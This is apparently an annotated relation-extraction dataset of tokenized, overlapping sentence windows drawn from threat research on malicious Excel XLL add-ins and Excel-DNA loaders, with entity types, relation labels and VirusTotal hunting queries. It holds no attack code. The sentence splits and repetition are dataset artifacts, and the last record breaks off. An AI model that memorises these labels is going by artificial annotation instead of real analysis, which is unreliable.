{"title": "607-8", "sents": [["Using", "auto", "start", "functions", ",", "the", "attackers", "are", "able", "to", "launch", "their", "malicious", "macro", "code", "."], ["The", "intent", "of", "this", "research", "is", "to", "show", "whether", "attackers", "have", "transitioned", "from", "using", "malicious", "VBA", "macros", "to", "using", "XLLs", "as", "the", "infection", "vector", ",", "specifically", "after", "Microsoft", "'", "s", "announcement", "about", "blocking", "VBA", "macros", "."], ["The", "difference", "between", "a", "regular", "DLL", "and", "an", "XLL", "file", "is", "that", "XLLs", "can", "implement", "certain", "exported", "functions", "which", "will", "be", "called", "by", "the", "Excel", "Add-In", "manager", "during", "some", "events", "triggered", "by", "the", "Excel", "application", "."], ["In", "order", "for", "an", "XLL", "add-in", "to", "be", "successfully", "loaded", "by", "the", "add-in", "manager", ",", "the", "XLL", "has", "to", "implement", "at", "least", "one", "exported", "function", ",", "called", "xlAutoOpen", ",", "in", "order", "for", "the", "add-in", "code", "to", "be", "called", "when", "the", "add-in", "is", "loaded", "by", "Excel", "."], ["XLL", "exports", "and", "the", "events", "when", "they", "are", "calledThe", "Excel", "XLL", "SDK", "consists", "of", "C/C++", "header", "files", "and", "libraries", "that", "allow", "XLL", "files", "to", "utilize", "the", "Excel", "API", "to", "access", "workbooks", "data", "and", "call", "Excel", "functions", "."], ["Most", "of", "the", "observed", "XLL", "malware", "samples", "are", "not", "created", "with", "the", "functionality", "to", "access", "Excel", "API", "but", "rather", "to", "execute", "its", "malicious", "code", "when", "the", "Excel", "Add-In", "manager", "calls", "xlAutoOpen", "or", "xlAutoClose", "functions", "."], ["An", "XLL", "file", "written", "in", "a", "."], ["NET", "language", "is", "compiled", "in", "a", "standalone", "file", "containing", "shim", "functions", "which", "map", "native", "exports", "to", "the", "CLR", "functions", "contained", "in", "a", "user-defined", "assembly", "DLL", "embedded", "in", "the", "resource", "section", "of", "the", "file", "generated", "by", "Excel-DNA", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "attackers", "pos": [6, 7], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [14, 14], "name": "code", "pos": [14, 15], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "VBA macros", "pos": [15, 17], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [35, 35], "name": "XLLs", "pos": [19, 20], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [57, 57], "name": "DLL", "pos": [5, 6], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [60, 60], "name": "XLL file", "pos": [8, 10], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [64, 64], "name": "XLLs", "pos": [12, 13], "index": "6_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [76, 76], "name": "Excel Add-In manager", "pos": [24, 27], "index": "7_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [85, 85], "name": "Excel", "pos": [33, 34], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [92, 92], "name": "XLL add-in", "pos": [4, 6], "index": "9_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [100, 100], "name": "add-in manager", "pos": [12, 14], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [104, 104], "name": "XLL", "pos": [16, 17], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [128, 128], "name": "add-in", "pos": [40, 41], "index": "12_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [132, 132], "name": "Excel", "pos": [44, 45], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [144, 144], "name": "XLL", "pos": [10, 11], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [155, 155], "name": "XLL files", "pos": [21, 23], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [175, 175], "name": "XLL malware samples", "pos": [4, 7], "index": "16_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 4}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 6}, {"r": "WR", "evidence": [1, 2], "t": 2, "h": 7}, {"r": "WR", "evidence": [2], "t": 4, "h": 7}, {"r": "EX", "evidence": [2], "t": 6, "h": 7}, {"r": "CO", "evidence": [2], "h": 7, "t": 8}, {"r": "EX", "evidence": [3], "t": 9, "h": 10}, {"r": "CO", "evidence": [3], "h": 11, "t": 12}, {"r": "CO", "evidence": [3], "t": 9, "h": 11}, {"r": "CO", "evidence": [3, 4], "h": 11, "t": 15}, {"r": "CO", "evidence": [3, 4], "h": 11, "t": 14}, {"r": "CO", "evidence": [3, 4, 5], "h": 11, "t": 16}, {"r": "CO", "evidence": [3], "h": 10, "t": 13}]}, {"title": "607-9", "sents": [["The", "intent", "of", "this", "research", "is", "to", "show", "whether", "attackers", "have", "transitioned", "from", "using", "malicious", "VBA", "macros", "to", "using", "XLLs", "as", "the", "infection", "vector", ",", "specifically", "after", "Microsoft", "'", "s", "announcement", "about", "blocking", "VBA", "macros", "."], ["The", "difference", "between", "a", "regular", "DLL", "and", "an", "XLL", "file", "is", "that", "XLLs", "can", "implement", "certain", "exported", "functions", "which", "will", "be", "called", "by", "the", "Excel", "Add-In", "manager", "during", "some", "events", "triggered", "by", "the", "Excel", "application", "."], ["In", "order", "for", "an", "XLL", "add-in", "to", "be", "successfully", "loaded", "by", "the", "add-in", "manager", ",", "the", "XLL", "has", "to", "implement", "at", "least", "one", "exported", "function", ",", "called", "xlAutoOpen", ",", "in", "order", "for", "the", "add-in", "code", "to", "be", "called", "when", "the", "add-in", "is", "loaded", "by", "Excel", "."], ["XLL", "exports", "and", "the", "events", "when", "they", "are", "calledThe", "Excel", "XLL", "SDK", "consists", "of", "C/C++", "header", "files", "and", "libraries", "that", "allow", "XLL", "files", "to", "utilize", "the", "Excel", "API", "to", "access", "workbooks", "data", "and", "call", "Excel", "functions", "."], ["Most", "of", "the", "observed", "XLL", "malware", "samples", "are", "not", "created", "with", "the", "functionality", "to", "access", "Excel", "API", "but", "rather", "to", "execute", "its", "malicious", "code", "when", "the", "Excel", "Add-In", "manager", "calls", "xlAutoOpen", "or", "xlAutoClose", "functions", "."], ["An", "XLL", "file", "written", "in", "a", "."], ["NET", "language", "is", "compiled", "in", "a", "standalone", "file", "containing", "shim", "functions", "which", "map", "native", "exports", "to", "the", "CLR", "functions", "contained", "in", "a", "user-defined", "assembly", "DLL", "embedded", "in", "the", "resource", "section", "of", "the", "file", "generated", "by", "Excel-DNA", "."], ["An", "Excel-DNA", "example", ":", "8KWKF", "is", "a", "user-defined", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "VBA macros", "pos": [15, 17], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [19, 19], "name": "XLLs", "pos": [19, 20], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [41, 41], "name": "DLL", "pos": [5, 6], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [44, 44], "name": "XLL file", "pos": [8, 10], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [48, 48], "name": "XLLs", "pos": [12, 13], "index": "4_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [60, 60], "name": "Excel Add-In manager", "pos": [24, 27], "index": "5_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [69, 69], "name": "Excel", "pos": [33, 34], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [76, 76], "name": "XLL add-in", "pos": [4, 6], "index": "7_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [84, 84], "name": "add-in manager", "pos": [12, 14], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [88, 88], "name": "XLL", "pos": [16, 17], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [112, 112], "name": "add-in", "pos": [40, 41], "index": "10_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [116, 116], "name": "Excel", "pos": [44, 45], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [128, 128], "name": "XLL", "pos": [10, 11], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [139, 139], "name": "XLL files", "pos": [21, 23], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [159, 159], "name": "XLL malware samples", "pos": [4, 7], "index": "14_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 1, "t": 4}, {"r": "WR", "evidence": [0, 1], "t": 0, "h": 5}, {"r": "WR", "evidence": [1], "t": 2, "h": 5}, {"r": "EX", "evidence": [1], "t": 4, "h": 5}, {"r": "CO", "evidence": [1], "h": 5, "t": 6}, {"r": "EX", "evidence": [2], "t": 7, "h": 8}, {"r": "CO", "evidence": [2], "h": 9, "t": 10}, {"r": "CO", "evidence": [2], "t": 7, "h": 9}, {"r": "CO", "evidence": [2, 3], "h": 9, "t": 13}, {"r": "CO", "evidence": [2, 3], "h": 9, "t": 12}, {"r": "CO", "evidence": [2, 3, 4], "h": 9, "t": 14}, {"r": "CO", "evidence": [2], "h": 8, "t": 11}]}, {"title": "607-10", "sents": [["The", "difference", "between", "a", "regular", "DLL", "and", "an", "XLL", "file", "is", "that", "XLLs", "can", "implement", "certain", "exported", "functions", "which", "will", "be", "called", "by", "the", "Excel", "Add-In", "manager", "during", "some", "events", "triggered", "by", "the", "Excel", "application", "."], ["In", "order", "for", "an", "XLL", "add-in", "to", "be", "successfully", "loaded", "by", "the", "add-in", "manager", ",", "the", "XLL", "has", "to", "implement", "at", "least", "one", "exported", "function", ",", "called", "xlAutoOpen", ",", "in", "order", "for", "the", "add-in", "code", "to", "be", "called", "when", "the", "add-in", "is", "loaded", "by", "Excel", "."], ["XLL", "exports", "and", "the", "events", "when", "they", "are", "calledThe", "Excel", "XLL", "SDK", "consists", "of", "C/C++", "header", "files", "and", "libraries", "that", "allow", "XLL", "files", "to", "utilize", "the", "Excel", "API", "to", "access", "workbooks", "data", "and", "call", "Excel", "functions", "."], ["Most", "of", "the", "observed", "XLL", "malware", "samples", "are", "not", "created", "with", "the", "functionality", "to", "access", "Excel", "API", "but", "rather", "to", "execute", "its", "malicious", "code", "when", "the", "Excel", "Add-In", "manager", "calls", "xlAutoOpen", "or", "xlAutoClose", "functions", "."], ["An", "XLL", "file", "written", "in", "a", "."], ["NET", "language", "is", "compiled", "in", "a", "standalone", "file", "containing", "shim", "functions", "which", "map", "native", "exports", "to", "the", "CLR", "functions", "contained", "in", "a", "user-defined", "assembly", "DLL", "embedded", "in", "the", "resource", "section", "of", "the", "file", "generated", "by", "Excel-DNA", "."], ["An", "Excel-DNA", "example", ":", "8KWKF", "is", "a", "user-defined", "."], ["NET", "assembly", "embedded", "within", "the", "resource", "sectionTogether", "with", "the", "user-defined", "assembly", "DLL", ",", "the", "resource", "section", "of", "the", "Excel-DNA", "generated", "add-in", "may", "contain", "a", "number", "of", "DLLs", "used", "to", "translate", "the", "native", "function", "calls", "into", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "DLL", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "XLL file", "pos": [8, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "XLLs", "pos": [12, 13], "index": "2_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [24, 24], "name": "Excel Add-In manager", "pos": [24, 27], "index": "3_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [33, 33], "name": "Excel", "pos": [33, 34], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [40, 40], "name": "XLL add-in", "pos": [4, 6], "index": "5_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [48, 48], "name": "add-in manager", "pos": [12, 14], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [52, 52], "name": "XLL", "pos": [16, 17], "index": "7_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [76, 76], "name": "add-in", "pos": [40, 41], "index": "8_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [80, 80], "name": "Excel", "pos": [44, 45], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [92, 92], "name": "XLL", "pos": [10, 11], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [103, 103], "name": "XLL files", "pos": [21, 23], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [123, 123], "name": "XLL malware samples", "pos": [4, 7], "index": "12_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 0, "h": 3}, {"r": "EX", "evidence": [0], "t": 2, "h": 3}, {"r": "CO", "evidence": [0], "h": 3, "t": 4}, {"r": "EX", "evidence": [1], "t": 5, "h": 6}, {"r": "CO", "evidence": [1], "h": 7, "t": 8}, {"r": "CO", "evidence": [1], "t": 5, "h": 7}, {"r": "CO", "evidence": [1, 2], "h": 7, "t": 11}, {"r": "CO", "evidence": [1, 2], "h": 7, "t": 10}, {"r": "CO", "evidence": [1, 2, 3], "h": 7, "t": 12}, {"r": "CO", "evidence": [1], "h": 6, "t": 9}]}, {"title": "607-11", "sents": [["In", "order", "for", "an", "XLL", "add-in", "to", "be", "successfully", "loaded", "by", "the", "add-in", "manager", ",", "the", "XLL", "has", "to", "implement", "at", "least", "one", "exported", "function", ",", "called", "xlAutoOpen", ",", "in", "order", "for", "the", "add-in", "code", "to", "be", "called", "when", "the", "add-in", "is", "loaded", "by", "Excel", "."], ["XLL", "exports", "and", "the", "events", "when", "they", "are", "calledThe", "Excel", "XLL", "SDK", "consists", "of", "C/C++", "header", "files", "and", "libraries", "that", "allow", "XLL", "files", "to", "utilize", "the", "Excel", "API", "to", "access", "workbooks", "data", "and", "call", "Excel", "functions", "."], ["Most", "of", "the", "observed", "XLL", "malware", "samples", "are", "not", "created", "with", "the", "functionality", "to", "access", "Excel", "API", "but", "rather", "to", "execute", "its", "malicious", "code", "when", "the", "Excel", "Add-In", "manager", "calls", "xlAutoOpen", "or", "xlAutoClose", "functions", "."], ["An", "XLL", "file", "written", "in", "a", "."], ["NET", "language", "is", "compiled", "in", "a", "standalone", "file", "containing", "shim", "functions", "which", "map", "native", "exports", "to", "the", "CLR", "functions", "contained", "in", "a", "user-defined", "assembly", "DLL", "embedded", "in", "the", "resource", "section", "of", "the", "file", "generated", "by", "Excel-DNA", "."], ["An", "Excel-DNA", "example", ":", "8KWKF", "is", "a", "user-defined", "."], ["NET", "assembly", "embedded", "within", "the", "resource", "sectionTogether", "with", "the", "user-defined", "assembly", "DLL", ",", "the", "resource", "section", "of", "the", "Excel-DNA", "generated", "add-in", "may", "contain", "a", "number", "of", "DLLs", "used", "to", "translate", "the", "native", "function", "calls", "into", "."], ["NET", "function", "calls", "and", "vice-versa", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "XLL add-in", "pos": [4, 6], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [12, 12], "name": "add-in manager", "pos": [12, 14], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [16, 16], "name": "XLL", "pos": [16, 17], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [40, 40], "name": "add-in", "pos": [40, 41], "index": "3_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [44, 44], "name": "Excel", "pos": [44, 45], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [56, 56], "name": "XLL", "pos": [10, 11], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [67, 67], "name": "XLL files", "pos": [21, 23], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [87, 87], "name": "XLL malware samples", "pos": [4, 7], "index": "7_0"}]], "labels": [{"r": "EX", "evidence": [0], "t": 0, "h": 1}, {"r": "CO", "evidence": [0], "h": 2, "t": 3}, {"r": "CO", "evidence": [0], "t": 0, "h": 2}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 6}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 5}, {"r": "CO", "evidence": [0, 1, 2], "h": 2, "t": 7}, {"r": "CO", "evidence": [0], "h": 1, "t": 4}]}, {"title": "607-12", "sents": [["XLL", "exports", "and", "the", "events", "when", "they", "are", "calledThe", "Excel", "XLL", "SDK", "consists", "of", "C/C++", "header", "files", "and", "libraries", "that", "allow", "XLL", "files", "to", "utilize", "the", "Excel", "API", "to", "access", "workbooks", "data", "and", "call", "Excel", "functions", "."], ["Most", "of", "the", "observed", "XLL", "malware", "samples", "are", "not", "created", "with", "the", "functionality", "to", "access", "Excel", "API", "but", "rather", "to", "execute", "its", "malicious", "code", "when", "the", "Excel", "Add-In", "manager", "calls", "xlAutoOpen", "or", "xlAutoClose", "functions", "."], ["An", "XLL", "file", "written", "in", "a", "."], ["NET", "language", "is", "compiled", "in", "a", "standalone", "file", "containing", "shim", "functions", "which", "map", "native", "exports", "to", "the", "CLR", "functions", "contained", "in", "a", "user-defined", "assembly", "DLL", "embedded", "in", "the", "resource", "section", "of", "the", "file", "generated", "by", "Excel-DNA", "."], ["An", "Excel-DNA", "example", ":", "8KWKF", "is", "a", "user-defined", "."], ["NET", "assembly", "embedded", "within", "the", "resource", "sectionTogether", "with", "the", "user-defined", "assembly", "DLL", ",", "the", "resource", "section", "of", "the", "Excel-DNA", "generated", "add-in", "may", "contain", "a", "number", "of", "DLLs", "used", "to", "translate", "the", "native", "function", "calls", "into", "."], ["NET", "function", "calls", "and", "vice-versa", "."], ["For", "example", ",", "the", "EXCELDNA", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "XLL", "pos": [10, 11], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [21, 21], "name": "XLL files", "pos": [21, 23], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [41, 41], "name": "XLL malware samples", "pos": [4, 7], "index": "2_0"}]], "labels": []}, {"title": "607-13", "sents": [["Most", "of", "the", "observed", "XLL", "malware", "samples", "are", "not", "created", "with", "the", "functionality", "to", "access", "Excel", "API", "but", "rather", "to", "execute", "its", "malicious", "code", "when", "the", "Excel", "Add-In", "manager", "calls", "xlAutoOpen", "or", "xlAutoClose", "functions", "."], ["An", "XLL", "file", "written", "in", "a", "."], ["NET", "language", "is", "compiled", "in", "a", "standalone", "file", "containing", "shim", "functions", "which", "map", "native", "exports", "to", "the", "CLR", "functions", "contained", "in", "a", "user-defined", "assembly", "DLL", "embedded", "in", "the", "resource", "section", "of", "the", "file", "generated", "by", "Excel-DNA", "."], ["An", "Excel-DNA", "example", ":", "8KWKF", "is", "a", "user-defined", "."], ["NET", "assembly", "embedded", "within", "the", "resource", "sectionTogether", "with", "the", "user-defined", "assembly", "DLL", ",", "the", "resource", "section", "of", "the", "Excel-DNA", "generated", "add-in", "may", "contain", "a", "number", "of", "DLLs", "used", "to", "translate", "the", "native", "function", "calls", "into", "."], ["NET", "function", "calls", "and", "vice-versa", "."], ["For", "example", ",", "the", "EXCELDNA", "."], ["LOADER", "assembly", "is", "tasked", "with", "loading", "the", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "XLL malware samples", "pos": [4, 7], "index": "0_0"}]], "labels": []}, {"title": "607-14", "sents": [["An", "XLL", "file", "written", "in", "a", "."], ["NET", "language", "is", "compiled", "in", "a", "standalone", "file", "containing", "shim", "functions", "which", "map", "native", "exports", "to", "the", "CLR", "functions", "contained", "in", "a", "user-defined", "assembly", "DLL", "embedded", "in", "the", "resource", "section", "of", "the", "file", "generated", "by", "Excel-DNA", "."], ["An", "Excel-DNA", "example", ":", "8KWKF", "is", "a", "user-defined", "."], ["NET", "assembly", "embedded", "within", "the", "resource", "sectionTogether", "with", "the", "user-defined", "assembly", "DLL", ",", "the", "resource", "section", "of", "the", "Excel-DNA", "generated", "add-in", "may", "contain", "a", "number", "of", "DLLs", "used", "to", "translate", "the", "native", "function", "calls", "into", "."], ["NET", "function", "calls", "and", "vice-versa", "."], ["For", "example", ",", "the", "EXCELDNA", "."], ["LOADER", "assembly", "is", "tasked", "with", "loading", "the", "."], ["NET", "framework", "and", "connecting", "it", "with", "the", "user-defined", "DLL", "."]], "vertexSet": [], "labels": []}, {"title": "607-15", "sents": [["NET", "language", "is", "compiled", "in", "a", "standalone", "file", "containing", "shim", "functions", "which", "map", "native", "exports", "to", "the", "CLR", "functions", "contained", "in", "a", "user-defined", "assembly", "DLL", "embedded", "in", "the", "resource", "section", "of", "the", "file", "generated", "by", "Excel-DNA", "."], ["An", "Excel-DNA", "example", ":", "8KWKF", "is", "a", "user-defined", "."], ["NET", "assembly", "embedded", "within", "the", "resource", "sectionTogether", "with", "the", "user-defined", "assembly", "DLL", ",", "the", "resource", "section", "of", "the", "Excel-DNA", "generated", "add-in", "may", "contain", "a", "number", "of", "DLLs", "used", "to", "translate", "the", "native", "function", "calls", "into", "."], ["NET", "function", "calls", "and", "vice-versa", "."], ["For", "example", ",", "the", "EXCELDNA", "."], ["LOADER", "assembly", "is", "tasked", "with", "loading", "the", "."], ["NET", "framework", "and", "connecting", "it", "with", "the", "user-defined", "DLL", "."], ["Excel-DNA", "requires", "the", "developer", "to", "instantiate", "an", "interface", "IExcelAddIn", "which", "will", "be", "called", "by", "the", "Excel-DNA", "loader", "."]], "vertexSet": [], "labels": []}, {"title": "607-16", "sents": [["An", "Excel-DNA", "example", ":", "8KWKF", "is", "a", "user-defined", "."], ["NET", "assembly", "embedded", "within", "the", "resource", "sectionTogether", "with", "the", "user-defined", "assembly", "DLL", ",", "the", "resource", "section", "of", "the", "Excel-DNA", "generated", "add-in", "may", "contain", "a", "number", "of", "DLLs", "used", "to", "translate", "the", "native", "function", "calls", "into", "."], ["NET", "function", "calls", "and", "vice-versa", "."], ["For", "example", ",", "the", "EXCELDNA", "."], ["LOADER", "assembly", "is", "tasked", "with", "loading", "the", "."], ["NET", "framework", "and", "connecting", "it", "with", "the", "user-defined", "DLL", "."], ["Excel-DNA", "requires", "the", "developer", "to", "instantiate", "an", "interface", "IExcelAddIn", "which", "will", "be", "called", "by", "the", "Excel-DNA", "loader", "."], ["The", "developer", "may", "then", "implement", "a", "class", "that", "will", "inherit", "from", "IExcelAddIn", "and", "define", "functions", "to", "overload", "the", "default", "implementations", "of", "functions", "that", "map", "to", "the", "functions", "automatically", "called", "by", "Excel", "."]], "vertexSet": [], "labels": []}, {"title": "607-17", "sents": [["NET", "assembly", "embedded", "within", "the", "resource", "sectionTogether", "with", "the", "user-defined", "assembly", "DLL", ",", "the", "resource", "section", "of", "the", "Excel-DNA", "generated", "add-in", "may", "contain", "a", "number", "of", "DLLs", "used", "to", "translate", "the", "native", "function", "calls", "into", "."], ["NET", "function", "calls", "and", "vice-versa", "."], ["For", "example", ",", "the", "EXCELDNA", "."], ["LOADER", "assembly", "is", "tasked", "with", "loading", "the", "."], ["NET", "framework", "and", "connecting", "it", "with", "the", "user-defined", "DLL", "."], ["Excel-DNA", "requires", "the", "developer", "to", "instantiate", "an", "interface", "IExcelAddIn", "which", "will", "be", "called", "by", "the", "Excel-DNA", "loader", "."], ["The", "developer", "may", "then", "implement", "a", "class", "that", "will", "inherit", "from", "IExcelAddIn", "and", "define", "functions", "to", "overload", "the", "default", "implementations", "of", "functions", "that", "map", "to", "the", "functions", "automatically", "called", "by", "Excel", "."], ["For", "example", ",", "xlAutoOpen", "function", "is", "mapped", "to", "IExcelAddIn", "."]], "vertexSet": [], "labels": []}, {"title": "607-18", "sents": [["NET", "function", "calls", "and", "vice-versa", "."], ["For", "example", ",", "the", "EXCELDNA", "."], ["LOADER", "assembly", "is", "tasked", "with", "loading", "the", "."], ["NET", "framework", "and", "connecting", "it", "with", "the", "user-defined", "DLL", "."], ["Excel-DNA", "requires", "the", "developer", "to", "instantiate", "an", "interface", "IExcelAddIn", "which", "will", "be", "called", "by", "the", "Excel-DNA", "loader", "."], ["The", "developer", "may", "then", "implement", "a", "class", "that", "will", "inherit", "from", "IExcelAddIn", "and", "define", "functions", "to", "overload", "the", "default", "implementations", "of", "functions", "that", "map", "to", "the", "functions", "automatically", "called", "by", "Excel", "."], ["For", "example", ",", "xlAutoOpen", "function", "is", "mapped", "to", "IExcelAddIn", "."], ["Evolution", "of", "malicious", "XLLsHunting", "for", "XLLs", "in", "VirusTotalArmed", "with", "the", "knowledge", "of", "what", "XLL", "files", "are", ",", "it", "will", "not", "be", "very", "difficult", "to", "search", "for", "the", "malicious", "files", "using", "the", "VirusTotal", "interface", "as", "well", "as", "internal", "sample", "repositories", "."]], "vertexSet": [], "labels": []}, {"title": "607-19", "sents": [["For", "example", ",", "the", "EXCELDNA", "."], ["LOADER", "assembly", "is", "tasked", "with", "loading", "the", "."], ["NET", "framework", "and", "connecting", "it", "with", "the", "user-defined", "DLL", "."], ["Excel-DNA", "requires", "the", "developer", "to", "instantiate", "an", "interface", "IExcelAddIn", "which", "will", "be", "called", "by", "the", "Excel-DNA", "loader", "."], ["The", "developer", "may", "then", "implement", "a", "class", "that", "will", "inherit", "from", "IExcelAddIn", "and", "define", "functions", "to", "overload", "the", "default", "implementations", "of", "functions", "that", "map", "to", "the", "functions", "automatically", "called", "by", "Excel", "."], ["For", "example", ",", "xlAutoOpen", "function", "is", "mapped", "to", "IExcelAddIn", "."], ["Evolution", "of", "malicious", "XLLsHunting", "for", "XLLs", "in", "VirusTotalArmed", "with", "the", "knowledge", "of", "what", "XLL", "files", "are", ",", "it", "will", "not", "be", "very", "difficult", "to", "search", "for", "the", "malicious", "files", "using", "the", "VirusTotal", "interface", "as", "well", "as", "internal", "sample", "repositories", "."], ["On", "VirusTotal", ",", "the", "basic", "way", "to", "search", "for", "malicious", "native", "XLL", "files", "submitted", "for", "the", "first", "time", ",", "for", "example", ",", "in", "November", "is", ":", "exports", ":", "xlAutoOpen", "positives:5+", "fs:2022-11-01+Perhaps", "also", "including", "XLLs", "that", "implement", "xlAutoClose", ":", "exports", ":", "xlAutoClose", "positives", "5+", "fs:2022-11-01+For", "Excel-DNA", "files", ",", "the", "situation", "is", "somewhat", "different", "."]], "vertexSet": [[{"type": "MF", "sent_id": 7, "global_pos": [168, 168], "name": "Excel-DNA files", "pos": [44, 46], "index": "0_0"}]], "labels": []}, {"title": "607-20", "sents": [["LOADER", "assembly", "is", "tasked", "with", "loading", "the", "."], ["NET", "framework", "and", "connecting", "it", "with", "the", "user-defined", "DLL", "."], ["Excel-DNA", "requires", "the", "developer", "to", "instantiate", "an", "interface", "IExcelAddIn", "which", "will", "be", "called", "by", "the", "Excel-DNA", "loader", "."], ["The", "developer", "may", "then", "implement", "a", "class", "that", "will", "inherit", "from", "IExcelAddIn", "and", "define", "functions", "to", "overload", "the", "default", "implementations", "of", "functions", "that", "map", "to", "the", "functions", "automatically", "called", "by", "Excel", "."], ["For", "example", ",", "xlAutoOpen", "function", "is", "mapped", "to", "IExcelAddIn", "."], ["Evolution", "of", "malicious", "XLLsHunting", "for", "XLLs", "in", "VirusTotalArmed", "with", "the", "knowledge", "of", "what", "XLL", "files", "are", ",", "it", "will", "not", "be", "very", "difficult", "to", "search", "for", "the", "malicious", "files", "using", "the", "VirusTotal", "interface", "as", "well", "as", "internal", "sample", "repositories", "."], ["On", "VirusTotal", ",", "the", "basic", "way", "to", "search", "for", "malicious", "native", "XLL", "files", "submitted", "for", "the", "first", "time", ",", "for", "example", ",", "in", "November", "is", ":", "exports", ":", "xlAutoOpen", "positives:5+", "fs:2022-11-01+Perhaps", "also", "including", "XLLs", "that", "implement", "xlAutoClose", ":", "exports", ":", "xlAutoClose", "positives", "5+", "fs:2022-11-01+For", "Excel-DNA", "files", ",", "the", "situation", "is", "somewhat", "different", "."], ["Because", "an", "Excel-DNA", "compiled", "file", "is", "a", "shim", ",", "it", "contains", "over", "10,000", "exports", "."]], "vertexSet": [[{"type": "MF", "sent_id": 6, "global_pos": [162, 162], "name": "Excel-DNA files", "pos": [44, 46], "index": "0_0"}]], "labels": []}, {"title": "607-21", "sents": [["NET", "framework", "and", "connecting", "it", "with", "the", "user-defined", "DLL", "."], ["Excel-DNA", "requires", "the", "developer", "to", "instantiate", "an", "interface", "IExcelAddIn", "which", "will", "be", "called", "by", "the", "Excel-DNA", "loader", "."], ["The", "developer", "may", "then", "implement", "a", "class", "that", "will", "inherit", "from", "IExcelAddIn", "and", "define", "functions", "to", "overload", "the", "default", "implementations", "of", "functions", "that", "map", "to", "the", "functions", "automatically", "called", "by", "Excel", "."], ["For", "example", ",", "xlAutoOpen", "function", "is", "mapped", "to", "IExcelAddIn", "."], ["Evolution", "of", "malicious", "XLLsHunting", "for", "XLLs", "in", "VirusTotalArmed", "with", "the", "knowledge", "of", "what", "XLL", "files", "are", ",", "it", "will", "not", "be", "very", "difficult", "to", "search", "for", "the", "malicious", "files", "using", "the", "VirusTotal", "interface", "as", "well", "as", "internal", "sample", "repositories", "."], ["On", "VirusTotal", ",", "the", "basic", "way", "to", "search", "for", "malicious", "native", "XLL", "files", "submitted", "for", "the", "first", "time", ",", "for", "example", ",", "in", "November", "is", ":", "exports", ":", "xlAutoOpen", "positives:5+", "fs:2022-11-01+Perhaps", "also", "including", "XLLs", "that", "implement", "xlAutoClose", ":", "exports", ":", "xlAutoClose", "positives", "5+", "fs:2022-11-01+For", "Excel-DNA", "files", ",", "the", "situation", "is", "somewhat", "different", "."], ["Because", "an", "Excel-DNA", "compiled", "file", "is", "a", "shim", ",", "it", "contains", "over", 